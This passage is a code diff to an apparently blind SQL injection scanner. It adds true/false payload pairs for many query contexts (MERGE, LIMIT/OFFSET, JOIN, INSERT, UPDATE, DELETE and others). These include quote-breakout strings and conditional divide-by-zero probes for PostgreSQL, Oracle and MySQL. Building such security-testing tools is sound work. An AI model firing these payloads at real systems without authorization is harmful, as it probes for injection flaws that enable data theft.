@@ -363,15 +363,437 @@ export class BooleanTester {
       return pairs;
     }
 
-    // 11. Standard Single-Quote String Context
-    // 11A. Core Logic Equality & Breakout Pairs
-    pairs.push({
-      name: 'Single Quote String Equality',
-      dbms: 'Generic SQL',
-      truePayload: "' AND '1'='1",
-      falsePayload: "' AND '1'='2",
-      expectedDiffDescription: 'TRUE matches baseline; FALSE deviates',
-    });
+    // 11. MERGE / UPSERT Clause Context
+    if (context === 'merge_clause') {
+      const origVal = param.originalValue.trim() || '1';
+      pairs.push({
+        name: 'MERGE ON Clause Boolean Predicate',
+        dbms: 'Generic SQL',
+        truePayload: `${origVal} AND 1=1`,
+        falsePayload: `${origVal} AND 1=2`,
+        expectedDiffDescription: 'MERGE ON clause match logic evaluation TRUE vs FALSE',
+      });
+      pairs.push({
+        name: 'MERGE Single-Quote String Boundary Breakout',
+        dbms: 'Generic SQL',
+        truePayload: "' OR '1'='1",
+        falsePayload: "' AND '1'='2",
+        expectedDiffDescription: 'String breakout in MERGE ON / WHEN MATCHED condition',
+      });
+      pairs.push({
+        name: 'MERGE Parenthesized ON Condition Balance',
+        dbms: 'Generic SQL',
+        truePayload: "') AND (1=1) AND ('1'='1",
+        falsePayload: "') AND (1=2) AND ('1'='1",
+        expectedDiffDescription: 'Parenthesis balancing inside MERGE ON (target.col = source.col) clause',
+      });
+      pairs.push({
+        name: 'MERGE PostgreSQL Divide-by-Zero Conditional Error',
+        dbms: 'PostgreSQL',
+        truePayload: `' AND (CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END)=1-- -`,
+        falsePayload: `' AND (CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END)=1-- -`,
+        expectedDiffDescription: 'MERGE execution runtime exception triggers HTTP 500 on TRUE vs 200 on FALSE',
+        isConditionalError: true,
+      });
+      pairs.push({
+        name: 'MERGE Oracle WHEN MATCHED Exception Trigger',
+        dbms: 'Oracle',
+        truePayload: `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`,
+        falsePayload: `'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`,
+        expectedDiffDescription: 'Oracle MERGE INTO exception trigger',
+        isConditionalError: true,
+      });
+      return pairs;
+    }
+
+    // 12. Date / Timestamp Temporal Context
+    if (context === 'date_time') {
+      const origVal = param.originalValue.trim();
+      pairs.push({
+        name: 'Temporal Equality Differential',
+        dbms: 'Generic SQL',
+        truePayload: `${origVal}' AND (CURRENT_DATE=CURRENT_DATE) AND '1'='1`,
+        falsePayload: `${origVal}' AND (CURRENT_DATE!=CURRENT_DATE) AND '1'='1`,
+        expectedDiffDescription: 'Temporal equality evaluates TRUE vs FALSE across date filter',
+      });
+      pairs.push({
+        name: 'Temporal NOW() / CURRENT_TIMESTAMP Evaluation',
+        dbms: 'Generic SQL',
+        truePayload: `${origVal}' AND (NOW()=NOW()) AND '1'='1`,
+        falsePayload: `${origVal}' AND (NOW()!=NOW()) AND '1'='1`,
+        expectedDiffDescription: 'Timestamp evaluation preserves records vs alters filter',
+      });
+      pairs.push({
+        name: 'Temporal PostgreSQL Divide-by-Zero Exception',
+        dbms: 'PostgreSQL',
+        truePayload: `${origVal}' AND (CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END)=1-- -`,
+        falsePayload: `${origVal}' AND (CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END)=1-- -`,
+        expectedDiffDescription: 'Temporal injection triggers divide-by-zero on TRUE',
+        isConditionalError: true,
+      });
+      pairs.push({
+        name: 'Temporal Oracle Date Arithmetic Differential',
+        dbms: 'Oracle',
+        truePayload: `${origVal}' AND (SYSDATE=SYSDATE)--`,
+        falsePayload: `${origVal}' AND (SYSDATE!=SYSDATE)--`,
+        expectedDiffDescription: 'Oracle SYSDATE invariant validation',
+      });
+      return pairs;
+    }
+
+    // 13. Vector DB / Similarity Operator Context
+    if (context === 'vector_op') {
+      const origVal = param.originalValue.trim() || '[0,0,0]';
+      pairs.push({
+        name: 'pgvector Distance Operator Identity Differential',
+        dbms: 'PostgreSQL',
+        truePayload: `${origVal}' <-> '[0,0,0]') >= 0 AND '1'='1`,
+        falsePayload: `${origVal}' <-> '[0,0,0]') < 0 AND '1'='1`,
+        expectedDiffDescription: 'Vector Euclidean distance non-negativity invariant',
+      });
+      pairs.push({
+        name: 'Vector Dimension Subquery Divide-by-Zero',
+        dbms: 'PostgreSQL',
+        truePayload: `${origVal}') AND (CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END)=1-- -`,
+        falsePayload: `${origVal}') AND (CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END)=1-- -`,
+        expectedDiffDescription: 'Vector query subquery exception triggers HTTP 500 on TRUE',
+        isConditionalError: true,
+      });
+      pairs.push({
+        name: 'Vector Generic Subquery Boundary Differential',
+        dbms: 'Generic SQL',
+        truePayload: `${origVal} AND 1=1`,
+        falsePayload: `${origVal} AND 1=2`,
+        expectedDiffDescription: 'Vector parameter boolean evaluation',
+      });
+      return pairs;
+    }
+
+    // 14. Array / Collection Context
+    if (context === 'array_derived') {
+      const origVal = param.originalValue.trim() || '1';
+      pairs.push({
+        name: 'Array PostgreSQL ANY() Membership Differential',
+        dbms: 'PostgreSQL',
+        truePayload: `${origVal}') AND (1 = ANY(ARRAY[1])) AND ('1'='1`,
+        falsePayload: `${origVal}') AND (1 = ANY(ARRAY[2])) AND ('1'='1`,
+        expectedDiffDescription: 'PostgreSQL array membership evaluates TRUE vs FALSE',
+      });
+      pairs.push({
+        name: 'Array Subquery Exception Trigger',
+        dbms: 'PostgreSQL',
+        truePayload: `${origVal}') AND (CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END)=1-- -`,
+        falsePayload: `${origVal}') AND (CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END)=1-- -`,
+        expectedDiffDescription: 'Array parameter runtime exception on TRUE',
+        isConditionalError: true,
+      });
+      return pairs;
+    }
+
+    // 15. LIMIT / OFFSET Context
+    if (context === 'limit_offset') {
+      const origVal = param.originalValue.trim() || '10';
+      pairs.push({
+        name: 'LIMIT / OFFSET Conditional Row Count Differential',
+        dbms: 'Generic SQL',
+        truePayload: `(CASE WHEN (1=1) THEN ${origVal} ELSE 0 END)`,
+        falsePayload: `(CASE WHEN (1=2) THEN ${origVal} ELSE 0 END)`,
+        expectedDiffDescription: 'LIMIT clause evaluates non-zero rows on TRUE vs 0 rows on FALSE',
+      });
+      pairs.push({
+        name: 'LIMIT / OFFSET PostgreSQL Subquery Divide-by-Zero',
+        dbms: 'PostgreSQL',
+        truePayload: `${origVal} OFFSET (SELECT CASE WHEN (1=1) THEN 0 ELSE 1/(SELECT 0) END)`,
+        falsePayload: `${origVal} OFFSET (SELECT CASE WHEN (1=2) THEN 0 ELSE 1/(SELECT 0) END)`,
+        expectedDiffDescription: 'OFFSET subquery evaluates cleanly on TRUE vs triggers HTTP 500 on FALSE',
+        isConditionalError: true,
+      });
+      pairs.push({
+        name: 'LIMIT Comma Row Count Differential',
+        dbms: 'MySQL',
+        truePayload: `${origVal}, (CASE WHEN (1=1) THEN 10 ELSE 0 END)`,
+        falsePayload: `${origVal}, (CASE WHEN (1=2) THEN 10 ELSE 0 END)`,
+        expectedDiffDescription: 'MySQL LIMIT offset,count conditional evaluation',
+      });
+      return pairs;
+    }
+
+    // 16. SELECT List / Projected Column Expression Context
+    if (context === 'select_expr') {
+      const origVal = param.originalValue.trim() || '1';
+      pairs.push({
+        name: 'SELECT List Conditional Expression Differential',
+        dbms: 'Generic SQL',
+        truePayload: `(CASE WHEN (1=1) THEN ${origVal} ELSE 9999 END)`,
+        falsePayload: `(CASE WHEN (1=2) THEN ${origVal} ELSE 9999 END)`,
+        expectedDiffDescription: 'Projected column reflects value based on condition',
+      });
+      pairs.push({
+        name: 'SELECT List Runtime Exception Trigger',
+        dbms: 'Generic SQL',
+        truePayload: `${origVal}, (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)`,
+        falsePayload: `${origVal}, (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END)`,
+        expectedDiffDescription: 'Appended projected expression triggers HTTP 500 on TRUE',
+        isConditionalError: true,
+      });
+      return pairs;
+    }
+
+    // 17. JOIN Condition Context
+    if (context === 'join_clause') {
+      const origVal = param.originalValue.trim() || '1=1';
+      pairs.push({
+        name: 'JOIN ON Predicate Boolean Differential',
+        dbms: 'Generic SQL',
+        truePayload: `${origVal} AND 1=1`,
+        falsePayload: `${origVal} AND 1=2`,
+        expectedDiffDescription: 'JOIN ON condition preserves joined rows on TRUE vs drops on FALSE',
+      });
+      pairs.push({
+        name: 'JOIN Condition Subquery Divide-by-Zero',
+        dbms: 'PostgreSQL',
+        truePayload: `${origVal} AND (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END)=1`,
+        falsePayload: `${origVal} AND (SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END)=1`,
+        expectedDiffDescription: 'JOIN condition runtime exception on TRUE',
+        isConditionalError: true,
+      });
+      return pairs;
+    }
+
+    // 18. CASE / WHEN Expression Context
+    if (context === 'case_expr') {
+      pairs.push({
+        name: 'CASE Expression Condition Evaluation',
+        dbms: 'Generic SQL',
+        truePayload: '1=1',
+        falsePayload: '1=2',
+        expectedDiffDescription: 'CASE WHEN conditional branch evaluation TRUE vs FALSE',
+      });
+      pairs.push({
+        name: 'CASE Subquery Exception Trigger',
+        dbms: 'Generic SQL',
+        truePayload: '(CASE WHEN (1=1) THEN 1/0 ELSE 1 END)=1',
+        falsePayload: '(CASE WHEN (1=2) THEN 1/0 ELSE 1 END)=1',
+        expectedDiffDescription: 'CASE subquery error on TRUE',
+        isConditionalError: true,
+      });
+      return pairs;
+    }
+
+    // 19. Window Function / Partition Context
+    if (context === 'window_func') {
+      pairs.push({
+        name: 'Window Partition Invariant Evaluation',
+        dbms: 'Generic SQL',
+        truePayload: '(CASE WHEN (1=1) THEN 1 ELSE 2 END)',
+        falsePayload: '(CASE WHEN (1=2) THEN 1 ELSE 2 END)',
+        expectedDiffDescription: 'Window function PARTITION BY evaluates conditional ranking',
+      });
+      pairs.push({
+        name: 'Window Function Divide-by-Zero Exception',
+        dbms: 'PostgreSQL',
+        truePayload: '(CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END)',
+        falsePayload: '(CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END)',
+        expectedDiffDescription: 'Window partition expression triggers exception on TRUE',
+        isConditionalError: true,
+      });
+      return pairs;
+    }
+
+    // 20. CTE / WITH Clause Context
+    if (context === 'cte_clause') {
+      pairs.push({
+        name: 'CTE Invariant Predicate Evaluation',
+        dbms: 'Generic SQL',
+        truePayload: '1=1',
+        falsePayload: '1=2',
+        expectedDiffDescription: 'CTE query evaluates TRUE vs FALSE',
+      });
+      pairs.push({
+        name: 'CTE Divide-by-Zero Exception',
+        dbms: 'PostgreSQL',
+        truePayload: '(CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END)=1',
+        falsePayload: '(CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END)=1',
+        expectedDiffDescription: 'CTE subquery error on TRUE',
+        isConditionalError: true,
+      });
+      return pairs;
+    }
+
+    // 21. Full-Text Search / Pattern Context
+    if (context === 'fulltext_search') {
+      const origVal = param.originalValue.trim() || 'search';
+      pairs.push({
+        name: 'Full-Text Search String Breakout Differential',
+        dbms: 'Generic SQL',
+        truePayload: `${origVal}' OR 1=1--`,
+        falsePayload: `${origVal}' AND 1=2--`,
+        expectedDiffDescription: 'Full-text query string breakout evaluates TRUE vs FALSE',
+      });
+      pairs.push({
+        name: 'Full-Text Subquery Exception Trigger',
+        dbms: 'PostgreSQL',
+        truePayload: `${origVal}' AND (CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END)=1-- -`,
+        falsePayload: `${origVal}' AND (CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END)=1-- -`,
+        expectedDiffDescription: 'FTS filter runtime exception on TRUE',
+        isConditionalError: true,
+      });
+      return pairs;
+    }
+
+    // 22. Spatial / GIS Context
+    if (context === 'spatial_op') {
+      const origVal = param.originalValue.trim() || "POINT(0 0)";
+      pairs.push({
+        name: 'Spatial Geometry Identity Differential',
+        dbms: 'Generic SQL',
+        truePayload: `${origVal}') AND 1=1 AND ('1'='1`,
+        falsePayload: `${origVal}') AND 1=2 AND ('1'='1`,
+        expectedDiffDescription: 'Spatial condition preserves records on TRUE vs FALSE',
+      });
+      pairs.push({
+        name: 'Spatial Subquery Divide-by-Zero Exception',
+        dbms: 'PostgreSQL',
+        truePayload: `${origVal}') AND (CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END)=1-- -`,
+        falsePayload: `${origVal}') AND (CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END)=1-- -`,
+        expectedDiffDescription: 'Spatial filter runtime exception on TRUE',
+        isConditionalError: true,
+      });
+      return pairs;
+    }
+
+    // 23. DELETE Condition Context
+    if (context === 'delete_where') {
+      const origVal = param.originalValue.trim() || '1';
+      pairs.push({
+        name: 'DELETE Safe Condition Differential',
+        dbms: 'Generic SQL',
+        truePayload: `${origVal} AND 1=1`,
+        falsePayload: `${origVal} AND 1=2`,
+        expectedDiffDescription: 'DELETE condition differential without destructive record modification',
+      });
+      pairs.push({
+        name: 'DELETE Subquery Exception Trigger',
+        dbms: 'PostgreSQL',
+        truePayload: `${origVal} AND (CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END)=1`,
+        falsePayload: `${origVal} AND (CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END)=1`,
+        expectedDiffDescription: 'DELETE statement runtime exception on TRUE',
+        isConditionalError: true,
+      });
+      return pairs;
+    }
+
+    // 24. Boolean Literal Parameter Context
+    if (context === 'boolean_literal') {
+      pairs.push({
+        name: 'Boolean Literal Arithmetic Invariant',
+        dbms: 'Generic SQL',
+        truePayload: 'true AND 1=1',
+        falsePayload: 'true AND 1=2',
+        expectedDiffDescription: 'Boolean literal argument evaluated TRUE vs FALSE',
+      });
+      pairs.push({
+        name: 'Boolean Literal Divide-by-Zero Exception',
+        dbms: 'PostgreSQL',
+        truePayload: 'true AND (CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END)=1',
+        falsePayload: 'true AND (CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END)=1',
+        expectedDiffDescription: 'Boolean parameter runtime exception on TRUE',
+        isConditionalError: true,
+      });
+      return pairs;
+    }
+
+    // 25. INSERT Values Context
+    if (context === 'insert_values') {
+      pairs.push({
+        name: 'INSERT Values Comma Subquery Invariant',
+        dbms: 'Generic SQL',
+        truePayload: "', (SELECT CASE WHEN (1=1) THEN 1 ELSE 2 END), '",
+        falsePayload: "', (SELECT CASE WHEN (1=2) THEN 1 ELSE 2 END), '",
+        expectedDiffDescription: 'INSERT values subquery evaluation TRUE vs FALSE',
+      });
+      pairs.push({
+        name: 'INSERT Values Subquery Divide-by-Zero',
+        dbms: 'PostgreSQL',
+        truePayload: "', (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END), '",
+        falsePayload: "', (SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END), '",
+        expectedDiffDescription: 'INSERT values runtime exception on TRUE',
+        isConditionalError: true,
+      });
+      return pairs;
+    }
+
+    // 26. UPDATE Set Context
+    if (context === 'update_set') {
+      pairs.push({
+        name: 'UPDATE Set Expression Differential',
+        dbms: 'Generic SQL',
+        truePayload: "(CASE WHEN (1=1) THEN 1 ELSE 2 END)",
+        falsePayload: "(CASE WHEN (1=2) THEN 1 ELSE 2 END)",
+        expectedDiffDescription: 'UPDATE SET column expression evaluates TRUE vs FALSE',
+      });
+      pairs.push({
+        name: 'UPDATE Set Subquery Divide-by-Zero',
+        dbms: 'PostgreSQL',
+        truePayload: "(CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END)",
+        falsePayload: "(CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END)",
+        expectedDiffDescription: 'UPDATE SET runtime exception on TRUE',
+        isConditionalError: true,
+      });
+      return pairs;
+    }
+
+    // 27. Subquery Context
+    if (context === 'subquery') {
+      pairs.push({
+        name: 'Subquery Invariant Evaluation',
+        dbms: 'Generic SQL',
+        truePayload: "(SELECT CASE WHEN (1=1) THEN 1 ELSE 2 END)",
+        falsePayload: "(SELECT CASE WHEN (1=2) THEN 1 ELSE 2 END)",
+        expectedDiffDescription: 'Subquery expression evaluates conditional branch',
+      });
+      pairs.push({
+        name: 'Subquery Runtime Exception Trigger',
+        dbms: 'PostgreSQL',
+        truePayload: "(SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END)",
+        falsePayload: "(SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END)",
+        expectedDiffDescription: 'Subquery runtime exception triggers HTTP 500 on TRUE',
+        isConditionalError: true,
+      });
+      return pairs;
+    }
+
+    // 28. WHERE Clause Context
+    if (context === 'where_clause') {
+      pairs.push({
+        name: 'WHERE Clause Boolean Differential',
+        dbms: 'Generic SQL',
+        truePayload: "1=1 AND 1=1",
+        falsePayload: "1=1 AND 1=2",
+        expectedDiffDescription: 'WHERE clause predicate preserves baseline records on TRUE',
+      });
+      pairs.push({
+        name: 'WHERE Clause Subquery Divide-by-Zero',
+        dbms: 'PostgreSQL',
+        truePayload: "1=1 AND (CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END)=1",
+        falsePayload: "1=1 AND (CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END)=1",
+        expectedDiffDescription: 'WHERE clause subquery error on TRUE',
+        isConditionalError: true,
+      });
+      return pairs;
+    }
+
+    // 29. Standard Single-Quote String Context
+    if (context === 'single_quote_string') {
+      // 11A. Core Logic Equality & Breakout Pairs
+      pairs.push({
+        name: 'Single Quote String Equality',
+        dbms: 'Generic SQL',
+        truePayload: "' AND '1'='1",
+        falsePayload: "' AND '1'='2",
+        expectedDiffDescription: 'TRUE matches baseline; FALSE deviates',
+      });
+    }
 
     pairs.push({
       name: 'Single Quote Commented Boolean',
